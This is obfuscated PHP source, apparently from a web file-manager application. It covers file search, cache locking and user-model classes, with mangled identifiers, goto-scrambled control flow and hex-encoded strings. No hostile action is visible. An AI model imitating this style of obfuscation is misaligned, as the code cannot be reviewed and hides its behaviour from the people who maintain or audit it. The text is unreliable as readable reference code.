dÜŒ•¥«ÁÃ: $AÔÈ†­æ’œ = $this->find($eŒ…ËºÜêš); $Aøíš‹Üì¶ = array($c«âÕŸ–½‚[415] => $AÔÈ†­æ’œ[$c«âÕŸ–½‚[415]], $c«âÕŸ–½‚[77] => $AÔÈ†­æ’œ[$c«âÕŸ–½‚[77]], $c«âÕŸ–½‚[107] => time(), $c«âÕŸ–½‚[376] => USER_ID); Model($c«âÕŸ–½‚[748])->where(array($c«âÕŸ–½‚[366] => $C‹ã…ªíí’))->save($Aøíš‹Üì¶); goto a÷ñİ‘ÇìÙ; aÆç÷Øéõš: } public function clearSame($døÉ‰£…ì) { goto cÌÄëËÁõ; F…ñ™óÏ¥: if (!$bäøº¡«¶ƒ) { return; } $this->where(array($fÙ«±‰Æ»[364] => array($fÙ«±‰Æ»[7], $bäøº¡«¶ƒ)))->delete(); Model($fÙ«±‰Æ»[418])->remove($BŞ•ÂëÅ); goto a´à¢ÌÙâ; cÌÄëËÁõ: $fÙ«±‰Æ» =& $_SERVER[£ü]; $F•ºíƒÅÇ˜ = $this->listData($døÉ‰£…ì); $dø—„ğ³Õ¿ = array_to_keyvalue_group($F•ºíƒÅÇ˜, $fÙ«±‰Æ»[415]); goto a¤¢¾Ÿ÷Œ–; a¤¢¾Ÿ÷Œ–: $BŞ•ÂëÅ = array(); $bäøº¡«¶ƒ = array(); foreach ($dø—„ğ³Õ¿ as $c±‡êã½á) { if (!$c±‡êã½á || count($c±‡êã½á) <= 1) { continue; } foreach ($c±‡êã½á as $D¿´Ñ©¢à‚) { $BŞ•ÂëÅ[] = $D¿´Ñ©¢à‚[$fÙ«±‰Æ»[415]]; $bäøº¡«¶ƒ[] = $D¿´Ñ©¢à‚[$fÙ«±‰Æ»[364]]; } } goto F…ñ™óÏ¥; a´à¢ÌÙâ: } public function userSpace() { $eÕƒˆÉ”¥† =& $_SERVER[£ü]; $e‹ÇĞ£Ò™Ã = $this->tablePrefix; $f³’æÚõ÷” = array($eÕƒˆÉ”¥†[1392] => USER_ID); $cê«¨…¤Ì™ = "{$e‹ÇĞ£Ò™Ã}\x69\157\x5f\x66\x69\x6c\x65\40\146\x69\154\145\x73\40\157\156\40\146\x69\x6c\x65\x73\56\x66\151\154\145\111\x44\40\75\x20\150\151\163\164\x6f\162\171\56\146\151\154\145\x49\x44"; return $this->alias($eÕƒˆÉ”¥†[2260])->where($f³’æÚõ÷”)->join($cê«¨…¤Ì™, $eÕƒˆÉ”¥†[2261])->sum($eÕƒˆÉ”¥†[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Dëß¶—Ó§») { goto eØª÷¤‡İí; eØª÷¤‡İí: $eá«–­İØº =& $_SERVER[£ü]; $CŞ±Ğ°¢® = KodIO::fileTypeList(); $fî†íÀ­œ– = $CŞ±Ğ°¢®[$Dëß¶—Ó§»]; goto d“‡é©…ô; A‘Ïé”½÷: if (!$fî†íÀ­œ–[$eá«–­İØº[157]]) { $b…é‘—öˆô = array_to_keyvalue($CŞ±Ğ°¢®, $eá«–­İØº[33], $eá«–­İØº[157]); $b˜ªÔæóÙÁ = implode($eá«–­İØº[47], $b…é‘—öˆô); $bæñÔêìØ’ = $eá«–­İØº[2218]; } $bÕÕ¹ÀÒøí = explode($eá«–­İØº[47], trim($b˜ªÔæóÙÁ, $eá«–­İØº[47])); return array($bæñÔêìØ’, $bÕÕ¹ÀÒøí); goto Eè„•å¡·ğ; d“‡é©…ô: if (!$fî†íÀ­œ–) { return array(); } $b˜ªÔæóÙÁ = $fî†íÀ­œ–[$eá«–­İØº[157]]; $bæñÔêìØ’ = $eá«–­İØº[7]; goto A‘Ïé”½÷; Eè„•å¡·ğ: } public function listPathType($cçŒğøø—Â) { $FœÜš¦— =& $_SERVER[£ü]; $bøÕ’¿°‘ = $this->fileTypeWhere($cçŒğøø—Â); if (!$bøÕ’¿°‘) { return array(); } $E¢Ä˜Ğì¼Ñ = array($FœÜš¦—[517] => SourceModel::TYPE_USER, $FœÜš¦—[518] => USER_ID, $FœÜš¦—[514] => 0, $FœÜš¦—[515] => $bøÕ’¿°‘); return $this->listSource($E¢Ä˜Ğì¼Ñ); } public function listSearch($cñ†°÷Ì¡, $b…„‚êŸÎ = 300) { goto fâÑìá‚ãÆ; Dœ©²×Ñˆ: $this->_listSearchDesc($D™­‰ÖÄÜ, $cñ†°÷Ì¡, $c©ÎªÂ’Ì); $this->_listSearchTag($D™­‰ÖÄÜ, $cñ†°÷Ì¡, $c©ÎªÂ’Ì); $this->_listDataApply($D™­‰ÖÄÜ[$a¦Œ»´¦ö[351]]); goto añï¶‰Ãù´; aç…Œæñ: $this->_listSearchBindPinyin($cñ†°÷Ì¡, $A Õ§Ù¬Ìö, $dš¦ôÆˆŞ); $this->alias($a¦Œ»´¦ö[483])->_makeOrder()->cache(null, 10); $D™­‰ÖÄÜ = $this->distinct(!0)->field($dš¦ôÆˆŞ)->where($A Õ§Ù¬Ìö)->selectPage($b…„‚êŸÎ); goto Dœ©²×Ñˆ; fâÑìá‚ãÆ: $a¦Œ»´¦ö =& $_SERVER[£ü]; if (isset($cñ†°÷Ì¡[$a¦Œ»´¦ö[2140]]) && $cñ†°÷Ì¡[$a¦Œ»´¦ö[2140]]) { $cñ†°÷Ì¡[$a¦Œ»´¦ö[2140]] = str_replace($a¦Œ»´¦ö[1553], $a¦Œ»´¦ö[2262], trim($cñ†°÷Ì¡[$a¦Œ»´¦ö[2140]])); } $A Õ§Ù¬Ìö = $this->_parseSearchWhere($cñ†°÷Ì¡); goto ağ™…‘ÊËö; añï¶‰Ãù´: $this->_listMake($D™­‰ÖÄÜ); return $D™­‰ÖÄÜ; goto CŒ‡Ïõª‡; ağ™…‘ÊËö: if (!isset($A Õ§Ù¬Ìö[$a¦Œ»´¦ö[393]])) { $A Õ§Ù¬Ìö[$a¦Œ»´¦ö[393]] = 0; } $dš¦ôÆˆŞ = $a¦Œ»´¦ö[2263]; $c©ÎªÂ’Ì = $dš¦ôÆˆŞ; goto aç…Œæñ; CŒ‡Ïõª‡: } private function _listSearchTag(&$b¤ÍöŠ¿¹æ, $eƒëÑ¼áÌƒ, $e¼¥š²ŞóÇ) { goto aèÓÅÇî¤Ø; C‘ÄÛØ×â: if (!$fŞ¤å„¼ä) { return; } $A’“‰ÆÑØÖ = array($EÄÅİ²îŞÏ[390] => array($EÄÅİ²îŞÏ[7], $fŞ¤å„¼ä)); $d´ƒÖ«µ§› = Model($EÄÅİ²îŞÏ[2265])->field($EÄÅİ²îŞÏ[75])->where($A’“‰ÆÑØÖ)->select(); goto BáÃÇÍ¿Í¼; FøÈ×ç‹¬: $fŞ¤å„¼ä = array(); $F§ïÜ®Øôƒ = $eƒëÑ¼áÌƒ[$EÄÅİ²îŞÏ[2140]]; foreach ($böñ ÂŞ™È as $dÑŞ£÷ªÕÀ) { $a•É÷ì •Ë = $dÑŞ£÷ªÕÀ[$EÄÅİ²îŞÏ[28]]; $eãøîƒ÷ƒù = str_replace($EÄÅİ²îŞÏ[50], $EÄÅİ²îŞÏ[33], Pinyin::encode($a•É÷ì •Ë)); if (stripos($a•É÷ì •Ë, $F§ïÜ®Øôƒ) !== !1 || stripos($eãøîƒ÷ƒù, $F§ïÜ®Øôƒ) !== !1) { $fŞ¤å„¼ä[] = $dÑŞ£÷ªÕÀ[$EÄÅİ²îŞÏ[364]]; } } goto C‘ÄÛØ×â; BáÃÇÍ¿Í¼: $d´ƒÖ«µ§› = array_to_keyvalue($d´ƒÖ«µ§›, $EÄÅİ²îŞÏ[33], $EÄÅİ²îŞÏ[75]); $f‰æ·Û ã = array_unique($d´ƒÖ«µ§›); $this->_listSearchMerge($b¤ÍöŠ¿¹æ, $eƒëÑ¼áÌƒ, $e¼¥š²ŞóÇ, $f‰æ·Û ã); goto eìÃ´¬¥Ò¡; aèÓÅÇî¤Ø: $EÄÅİ²îŞÏ =& $_SERVER[£ü]; if (!$eƒëÑ¼áÌƒ[$EÄÅİ²îŞÏ[2140]] || $b¤ÍöŠ¿¹æ[$EÄÅİ²îŞÏ[348]][$EÄÅİ²îŞÏ[337]] > 1) { return; } $böñ ÂŞ™È = Model($EÄÅİ²îŞÏ[2264])->listData(); goto FøÈ×ç‹¬; eìÃ´¬¥Ò¡: } private function _listSearchDesc(&$CìÊŸ§™æ¬, $FÌÀ¬ÛÉ¾, $A¬ÏÍæˆ) { goto Cšß·¿¤Œ; aõœ‰µšÊ‹: $fÒ¿ˆÅÜö¢ = array_unique($fÒ¿ˆÅÜö¢); if (!$fÒ¿ˆÅÜö¢) { return; } $CÉš‘Å±í = array($C™«ï…ÜšØ[366] => array($C™«ï…ÜšØ[7], $fÒ¿ˆÅÜö¢), $C™«ï…ÜšØ[89] => $C™«ï…ÜšØ[401], $C™«ï…ÜšØ[356] => array($C™«ï…ÜšØ[747], $C™«ï…ÜšØ[2142] . $FÌÀ¬ÛÉ¾[$C™«ï…ÜšØ[2140]] . $C™«ï…ÜšØ[2142])); goto cù—µÈ¨ÀÑ; Cšß·¿¤Œ: $C™«ï…ÜšØ =& $_SERVER[£ü]; if (!$FÌÀ¬ÛÉ¾[$C™«ï…ÜšØ[2140]] || $CìÊŸ§™æ¬[$C™«ï…ÜšØ[348]][$C™«ï…ÜšØ[337]] > 1) { return; } $fÒ¿ˆÅÜö¢ = $this->listSearchChildren($FÌÀ¬ÛÉ¾[$C™«ï…ÜšØ[457]]); goto aõœ‰µšÊ‹; cù—µÈ¨ÀÑ: $AÙ´¡‡£İ = Model($C™«ï…ÜšØ[500])->field($C™«ï…ÜšØ[366])->where($CÉš‘Å±í)->select(); $B¶ˆ•ÃÌ = array_to_keyvalue($AÙ´¡‡£İ, $C™«ï…ÜšØ[33], $C™«ï…ÜšØ[366]); $this->_listSearchMerge($CìÊŸ§™æ¬, $FÌÀ¬ÛÉ¾, $A¬ÏÍæˆ, $B¶ˆ•ÃÌ); goto bº¼¹—›°; bº¼¹—›°: } private function _listSearchMerge(&$cÈ•ÎÎ´¼ì, $Dùô˜¯Àè–, $aˆÀâˆçé, $dœÖà·¹ƒ‹) { goto f­‘ »ÎÆÍ; f¶˜ÏÌÒ³: $FëÀ¥Á¼‘ = array_diff($dœÖà·¹ƒ‹, $e³”Áïğ‡•); if (!$FëÀ¥Á¼‘) { return; } $BÆ˜·ªÅï‚ = array($díñåÄ‡´Ë[366] => array($díñåÄ‡´Ë[7], $FëÀ¥Á¼‘)); goto A‚áª²Õ‡Ä; f­‘ »ÎÆÍ: $díñåÄ‡´Ë =& $_SERVER[£ü]; if (!$dœÖà·¹ƒ‹) { return; } $e³”Áïğ‡• = array_to_keyvalue($cÈ•ÎÎ´¼ì[$díñåÄ‡´Ë[351]], $díñåÄ‡´Ë[33], $díñåÄ‡´Ë[366]); goto f¶˜ÏÌÒ³; A‚áª²Õ‡Ä: $cÂŠ™ôª‰– = $this->field($aˆÀâˆçé)->where($BÆ˜·ªÅï‚)->select(); if (!$cÂŠ™ôª‰–) { return; } $dÌ¶Ÿ´ÖÊ‘ = array(); goto Fñ×ï¹¥; Fñ×ï¹¥: foreach ($cÂŠ™ôª‰– as $DˆÚÍ…—â«) { $A¸ß—ª‹ÙÖ = $díñåÄ‡´Ë[47] . $Dùô˜¯Àè–[$díñåÄ‡´Ë[457]] . $díñåÄ‡´Ë[47]; if (stripos($DˆÚÍ…—â«[$díñåÄ‡´Ë[455]], $A¸ß—ª‹ÙÖ) !== !1) { $dÌ¶Ÿ´ÖÊ‘[] = $DˆÚÍ…—â«; } } $cÈ•ÎÎ´¼ì[$díñåÄ‡´Ë[351]] = array_merge($dÌ¶Ÿ´ÖÊ‘, $cÈ•ÎÎ´¼ì[$díñåÄ‡´Ë[351]]); $cÈ•ÎÎ´¼ì[$díñåÄ‡´Ë[348]][$díñåÄ‡´Ë[349]] += count($dÌ¶Ÿ´ÖÊ‘); goto a†´Ì³İº; a†´Ì³İº: } public function listSearchChildren($FÂµ²ä‡, $BÖî‹äÙÆŒ = 5000) { goto f£À ¯çƒÂ; f£À ¯çƒÂ: $DŸÌµ³àøÙ =& $_SERVER[£ü]; $e¾¼–¿Ëòº = array(); $eâ÷‰›ÁØ¤ = $this->sourceInfo($FÂµ²ä‡); goto eñîª¿¾¾’; eñîª¿¾¾’: $CòÑ‰¸èäŞ = array($DŸÌµ³àøÙ[455] => array($DŸÌµ³àøÙ[747], $eâ÷‰›ÁØ¤[$DŸÌµ³àøÙ[455]] . $eâ÷‰›ÁØ¤[$DŸÌµ³àøÙ[366]] . $DŸÌµ³àøÙ[480])); $Eâ› †‚ = $this->field($DŸÌµ³àøÙ[366])->cache(null, 600)->where($CòÑ‰¸èäŞ)->count(); if ($Eâ› †‚ > $BÖî‹äÙÆŒ) { return $this->_listSearchChildrenNear($FÂµ²ä‡, $BÖî‹äÙÆŒ); } goto A†À¢Ø³Æ; A†À¢Ø³Æ: $bç½êÏÛ†Ê = $this->field($DŸÌµ³àøÙ[366])->where($CòÑ‰¸èäŞ)->select(); $e¾¼–¿Ëòº = array_to_keyvalue($bç½êÏÛ†Ê, $DŸÌµ³àøÙ[33], $DŸÌµ³àøÙ[366]); return $e¾¼–¿Ëòº; goto E’Ÿ‚; E’Ÿ‚: } private function _listSearchChildrenNear($BŒ•÷ãÎ’ò, $b¸¡åŞ¥ø) { goto FÙ…Ü´£´; B½›…ïÂÎó: if (!$AÈ‡İÅ†Ç) { return $d¢…’‡Â¶ç; } $câÚÖÈîš¯ = array($bËÖà¬É¸ª[457] => array($bËÖà¬É¸ª[7], $AÈ‡İÅ†Ç)); $a§©ÕåÓ¤Š = $this->field($bËÖà¬É¸ª[2266])->where($câÚÖÈîš¯)->select(); goto C–•ğøæâæ; FÙ…Ü´£´: $bËÖà¬É¸ª =& $_SERVER[£ü]; $d¢…’‡Â¶ç = array(); $câÚÖÈîš¯ = array($bËÖà¬É¸ª[457] => $BŒ•÷ãÎ’ò); goto DâŞÉ­; DâŞÉ­: $a§©ÕåÓ¤Š = $this->field($bËÖà¬É¸ª[2266])->where($câÚÖÈîš¯)->select(); $AÈ‡İÅ†Ç = array_to_keyvalue(array_filter_by_field($a§©ÕåÓ¤Š, $bËÖà¬É¸ª[367], $bËÖà¬É¸ª[83]), $bËÖà¬É¸ª[33], $bËÖà¬É¸ª[366]); $d¢…’‡Â¶ç = array_merge($d¢…’‡Â¶ç, array_to_keyvalue($a§©ÕåÓ¤Š, $bËÖà¬É¸ª[33], $bËÖà¬É¸ª[366])); goto B½›…ïÂÎó; C–•ğøæâæ: $d¢…’‡Â¶ç = array_merge($d¢…’‡Â¶ç, array_to_keyvalue($a§©ÕåÓ¤Š, $bËÖà¬É¸ª[33], $bËÖà¬É¸ª[366])); $d¢…’‡Â¶ç = array_slice($d¢…’‡Â¶ç, 0, $b¸¡åŞ¥ø); return $d¢…’‡Â¶ç; goto a¥ëŒãœ›¤; a¥ëŒãœ›¤: } private function _listSearchBindPinyin($b³ÈÀ¢¶£©, &$Aå…Ô­µ±ğ, &$BÑË³©Á™¹) { goto BäŞâ”ÔË; f¸¤×”‘Üµ: $E«¹ìä¯Šê[] = array($E¾‰õÈ‘çƒ[2270] => $FÚ•Ğáä„Ñ, $E¾‰õÈ‘çƒ[904] => $E¾‰õÈ‘çƒ[2144], array($E¾‰õÈ‘çƒ[2271] => $FÚ•Ğáä„Ñ, $E¾‰õÈ‘çƒ[2272] => array($E¾‰õÈ‘çƒ[7], array($E¾‰õÈ‘çƒ[412], $E¾‰õÈ‘çƒ[411])))); $this->join($fà“§ôÌ÷Ø); $Aå…Ô­µ±ğ = $E«¹ìä¯Šê; goto fŒÙñø·é; a¾š‹‰„ãŞ: $E«¹ìä¯Šê = array(); $BÑË³©Á™¹ = str_replace(array($E¾‰õÈ‘çƒ[214], $E¾‰õÈ‘çƒ[50], $E¾‰õÈ‘çƒ[2267]), $E¾‰õÈ‘çƒ[33], $BÑË³©Á™¹); $BÑË³©Á™¹ = $E¾‰õÈ‘çƒ[2268] . str_replace($E¾‰õÈ‘çƒ[47], $E¾‰õÈ‘çƒ[2269], $BÑË³©Á™¹); goto DÕÅ…¾¿£»; DÕÅ…¾¿£»: unset($Aå…Ô­µ±ğ[$E¾‰õÈ‘çƒ[28]]); foreach ($Aå…Ô­µ±ğ as $aÓÊÂ˜Ë©¨ => $d½¡Š­“’‡) { $E«¹ìä¯Šê[$E¾‰õÈ‘çƒ[2268] . $aÓÊÂ˜Ë©¨] = $d½¡Š­“’‡; } $FÚ•Ğáä„Ñ = array($E¾‰õÈ‘çƒ[479], $E¾‰õÈ‘çƒ[2142] . $b³ÈÀ¢¶£©[$E¾‰õÈ‘çƒ[2140]] . $E¾‰õÈ‘çƒ[2142]); goto f¸¤×”‘Üµ; BäŞâ”ÔË: $E¾‰õÈ‘çƒ =& $_SERVER[£ü]; if (!Input::check($b³ÈÀ¢¶£©[$E¾‰õÈ‘çƒ[2140]], $E¾‰õÈ‘çƒ[303]) || strlen($b³ÈÀ¢¶£©[$E¾‰õÈ‘çƒ[2140]]) < 2) { return; } $fà“§ôÌ÷Ø = "\x4c\x45\106\x54\40\112\117\x49\116\x20{$this->tablePrefix}\151\157\137\163\157\x75\162\143\145\137\x6d\x65\164\141\x20\x6d\145\164\141\40\x6f\x6e\40\x73\x6f\165\162\143\145\56\163\157\165\x72\x63\145\x49\104\x20\75\x20\155\x65\x74\x61\56\163\157\x75\162\143\145\111\104"; goto a¾š‹‰„ãŞ; fŒÙñø·é: } private function _parseSearchWhere($Cî›‡¬õØÉ) { goto AøËëŒ†õ¬; f…ã¬¼Š‰–: if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[2140]]) && $Cî›‡¬õØÉ[$a‡‚ãºîĞ[2140]]) { $EîÃƒ°áàë = $Cî›‡¬õØÉ[$a‡‚ãºîĞ[2140]]; $aÆ·ê¦ä˜ = explode($a‡‚ãºîĞ[50], $EîÃƒ°áàë); if (strlen($EîÃƒ°áàë) > 2 && (substr($EîÃƒ°áàë, 0, 1) == $a‡‚ãºîĞ[113] && substr($EîÃƒ°áàë, -1) == $a‡‚ãºîĞ[113]) || substr($EîÃƒ°áàë, 0, 1) == $a‡‚ãºîĞ[55] && substr($EîÃƒ°áàë, -1) == $a‡‚ãºîĞ[55]) { $EîÃƒ°áàë = substr($EîÃƒ°áàë, 1, -1); $aÆ·ê¦ä˜ = array($EîÃƒ°áàë); } $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[28]] = array($a‡‚ãºîĞ[479], $a‡‚ãºîĞ[2142] . $EîÃƒ°áàë . $a‡‚ãºîĞ[2142]); if (count($aÆ·ê¦ä˜) > 1) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[28]] = array(); foreach ($aÆ·ê¦ä˜ as $a³ƒõ™±£Õ) { if (!trim($a³ƒõ™±£Õ)) { continue; } $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[28]][] = array($a‡‚ãºîĞ[479], $a‡‚ãºîĞ[2142] . trim($a³ƒõ™±£Õ) . $a‡‚ãºîĞ[2142]); } } } return $eäÑ‡Ø…ñ™; goto CÃ‰‚Ù–‚Û; DåÊ›‘§‚ó: if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[531]])) { $eäÑ‡Ø…ñ™[] = array($a‡‚ãºîĞ[376] => $Cî›‡¬õØÉ[$a‡‚ãºîĞ[531]], $a‡‚ãºîĞ[375] => $Cî›‡¬õØÉ[$a‡‚ãºîĞ[531]], $a‡‚ãºîĞ[904] => $a‡‚ãºîĞ[2144]); } if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[369]])) { $f©Í™ğç¹œ = $Cî›‡¬õØÉ[$a‡‚ãºîĞ[369]]; if ($f©Í™ğç¹œ == $a‡‚ãºîĞ[76]) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[367]] = 1; } else { if ($f©Í™ğç¹œ == $a‡‚ãºîĞ[2278]) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[367]] = 0; } else { if ($f©Í™ğç¹œ) { $f©Í™ğç¹œ = is_array($f©Í™ğç¹œ) ? $f©Í™ğç¹œ : explode($a‡‚ãºîĞ[47], $f©Í™ğç¹œ); $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[369]] = array($a‡‚ãºîĞ[381], $f©Í™ğç¹œ); $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[367]] = 0; } } } } if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[457]])) { $A²ÈğÆ“èğ = $this->sourceInfo($Cî›‡¬õØÉ[$a‡‚ãºîĞ[457]]); $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[521]] = array($a‡‚ãºîĞ[479], $A²ÈğÆ“èğ[$a‡‚ãºîĞ[455]] . $Cî›‡¬õØÉ[$a‡‚ãºîĞ[457]] . $a‡‚ãºîĞ[480]); } goto f…ã¬¼Š‰–; bé´Ë¨‘: if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[692]])) { $Aîåšùƒ‰è = array($a‡‚ãºîĞ[2274], $Cî›‡¬õØÉ[$a‡‚ãºîĞ[692]]); if ($eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[107]]) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[107]] = array($eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[107]], $Aîåšùƒ‰è, $a‡‚ãºîĞ[2275]); } else { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[107]] = $Aîåšùƒ‰è; } } if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[2276]])) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[77]] = array($a‡‚ãºîĞ[2273], $Cî›‡¬õØÉ[$a‡‚ãºîĞ[2276]]); } if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[2277]])) { $Aîåšùƒ‰è = array($a‡‚ãºîĞ[2274], $Cî›‡¬õØÉ[$a‡‚ãºîĞ[2277]]); if ($eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[77]]) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[77]] = array($eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[77]], $Aîåšùƒ‰è, $a‡‚ãºîĞ[2275]); } else { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[77]] = $Aîåšùƒ‰è; } } goto DåÊ›‘§‚ó; AøËëŒ†õ¬: $a‡‚ãºîĞ =& $_SERVER[£ü]; $eäÑ‡Ø…ñ™ = array(); if (isset($Cî›‡¬õØÉ[$a‡‚ãºîĞ[691]])) { $eäÑ‡Ø…ñ™[$a‡‚ãºîĞ[107]] = array($a‡‚ãºîĞ[2273], $Cî›‡¬õØÉ[$a‡‚ãºîĞ[691]]); } goto bé´Ë¨‘; CÃ‰‚Ù–‚Û: } } goto EÉğÄ£•È÷; D‡±ç‹—: class CacheLockRedis { public function lock($A†ÁŸÒó½‘, $a£ò’°ÖÅ = 10) { $DÔ™…è¸Éæ = Cache::init(); $DÙµœÀ¦İ” = microtime(!0) + $a£ò’°ÖÅ; while (microtime(!0) < $DÙµœÀ¦İ”) { $aˆ÷Ø±’× = $DÔ™…è¸Éæ->get($A†ÁŸÒó½‘); if (!$aˆ÷Ø±’×) { $DÎ†’áÊ¥ = $DÔ™…è¸Éæ->setLock($A†ÁŸÒó½‘, $DÙµœÀ¦İ”, $a£ò’°ÖÅ); if ($DÎ†’áÊ¥) { return !0; } } else { if ($aˆ÷Ø±’× < microtime(!0)) { $DÔ™…è¸Éæ->set($A†ÁŸÒó½‘, $DÙµœÀ¦İ”, $DÙµœÀ¦İ”); if ($DÔ™…è¸Éæ->get($A†ÁŸÒó½‘) === $aˆ÷Ø±’×) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($E§Ëè²‰Æ) { return Cache::init()->get($E§Ëè²‰Æ); } public function unlock($DàÕƒÒ…ÂÑ) { return Cache::init()->remove($DàÕƒÒ…ÂÑ); } } class CacheLockMemcached { public function lock($Cî¥«ĞÒí±, $aë¾Šøâ = 0) { $e«İ¿ÁìØ‰ = Cache::init(); $B•ëİÏŞê = microtime(!0) + $aë¾Šøâ; while (microtime(!0) < $B•ëİÏŞê) { $B½‰ó¥æÈŸ = $e«İ¿ÁìØ‰->get($Cî¥«ĞÒí±); if (!$B½‰ó¥æÈŸ || $B½‰ó¥æÈŸ < microtime(!0)) { $Fâ‡¡ÕªÆ‹ = $e«İ¿ÁìØ‰->handle->add($Cî¥«ĞÒí±, $B•ëİÏŞê, $aë¾Šøâ); if ($Fâ‡¡ÕªÆ‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a“ºÖïåÃ‘) { return Cache::init()->get($a“ºÖïåÃ‘); } public function unlock($B¶†Í±ÇÛˆ) { return Cache::init()->remove($B¶†Í±ÇÛˆ); } } class CacheLockDatabase { public function lock($e¥Äß”Éâ°, $EºÖòçÛ‹ˆ = 0) { $eÎ¨¢‹µŞÊ = Model($_SERVER[£ü][751]); $dÄ¯¥èÁ¤ = microtime(!0) + $EºÖòçÛ‹ˆ; while (microtime(!0) < $dÄ¯¥èÁ¤) { $e ¿Ï†Ã²É = $eÎ¨¢‹µŞÊ->get($e¥Äß”Éâ°); if (!$e ¿Ï†Ã²É || $e ¿Ï†Ã²É < microtime(!0)) { $C……ì‰À‹ = $eÎ¨¢‹µŞÊ->set($e¥Äß”Éâ°, $dÄ¯¥èÁ¤); if ($C……ì‰À‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($A‡Œ–ŸÒ‰) { return Model($_SERVER[£ü][751])->get($A‡Œ–ŸÒ‰); } public function unlock($fíÚ¾Ï—¼î) { Model($_SERVER[£ü][751])->remove($fíÚ¾Ï—¼î); } } goto C¥¤õ†ƒ¾é; DÀƒ‚ŒÇ‘: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\x6d\x65" => "\x75\163\145\162\137\x6d\x65\x74\x61", "\x6d\x65\164\x61\106\x69\x65\154\144" => "\x75\x73\x65\x72\111\x44"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\156\151\x63\x6b\116\141\x6d\x65\x2c\x6e\141\x6d\145\54\141\x76\x61\x74\141\162\x2c\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($CÀŠöçÏ¿) { $Câ´™‰¬Ğï =& $_SERVER[£ü]; $CíÇê¯ìŒŞ = $Câ´™‰¬Ğï[2441]; return array($Câ´™‰¬Ğï[2130] => array($CÀŠöçÏ¿[0], $CíÇê¯ìŒŞ), $Câ´™‰¬Ğï[2132] => array($CÀŠöçÏ¿[0], $CíÇê¯ìŒŞ), $Câ´™‰¬Ğï[2442] => array($CÀŠöçÏ¿[0], $CíÇê¯ìŒŞ)); } protected function getInfo($cƒµİÕŒ¸Õ, $e…³²«‹â = false) { $D¦¤ƒÜã¥š = $this->getInfoSimple($cƒµİÕŒ¸Õ); if (!is_array($D¦¤ƒÜã¥š)) { return array(); } if ($e…³²«‹â) { return $this->_getInfoApply($D¦¤ƒÜã¥š); } return $this->cacheFunctionGet($_SERVER[£ü][2172], $cƒµİÕŒ¸Õ); } protected function getInfoFull($bö÷Ò—­®¹, $Cá‰½ˆ÷¢¸ = false) { $dòŒŠˆÚåÊ = $this->getInfoSimple($bö÷Ò—­®¹); if (!is_array($dòŒŠˆÚåÊ)) { return array(); } if ($Cá‰½ˆ÷¢¸) { return $this->_getInfoApply($dòŒŠˆÚåÊ, !0); return $this->_getInfoApply($dòŒŠˆÚåÊ, !0); } return $this->cacheFunctionGet($_SERVER[£ü][2443], $bö÷Ò—­®¹); } private function _getInfoApply($eÊêíÎ„‚¶, $Bëê”ÄÈ•™ = false) { goto bÃ«ğéË‹; bÃ«ğéË‹: $dĞ†âƒ–èõ =& $_SERVER[£ü]; if (!$eÊêíÎ„‚¶) { return $eÊêíÎ„‚¶; } $dœÇœ‘ÍŠ = md5($dĞ†âƒ–èõ[2444] . $eÊêíÎ„‚¶[$dĞ†âƒ–èõ[792]] . $dĞ†âƒ–èõ[2445] . $eÊêíÎ„‚¶[$dĞ†âƒ–èõ[28]]); goto e¯£Û¼æÆ¦; Añ…¶îÕ£—: $eÊêíÎ„‚¶[$dĞ†âƒ–èõ[388]][$dĞ†âƒ–èõ[2280]] = isset($cÃ ²ÏÒ²’[$dĞ†âƒ–èõ[2281]]) ? $cÃ ²ÏÒ²’[$dĞ†âƒ–èõ[2281]] : null; if ($Bëê”ÄÈ•™) { $eÊêíÎ„‚¶[$dĞ†âƒ–èõ[413]] = $this->metaGet($eÊêíÎ„‚¶[$dĞ†âƒ–èõ[1401]]); } return $eÊêíÎ„‚¶; goto e«ä’Š ª­; e¯£Û¼æÆ¦: $eÊêíÎ„‚¶ = $this->_listDataApplyItem($eÊêíÎ„‚¶); $cÃ ²ÏÒ²’ = Model($dĞ†âƒ–èõ[1100])->metaGet($eÊêíÎ„‚¶[$dĞ†âƒ–èõ[388]][$dĞ†âƒ–èõ[366]]); $eÊêíÎ„‚¶[$dĞ†âƒ–èõ[2446]] = $dœÇœ‘ÍŠ; goto Añ…¶îÕ£—; e«ä’Š ª­: } protected function getInfoSimple($d‘­ù †÷, $cÊœ™©ÙåÉ = false) { $dµ™Œ®ù¿Œ =& $_SERVER[£ü]; if (!$d‘­ù †÷) { return array(); } if 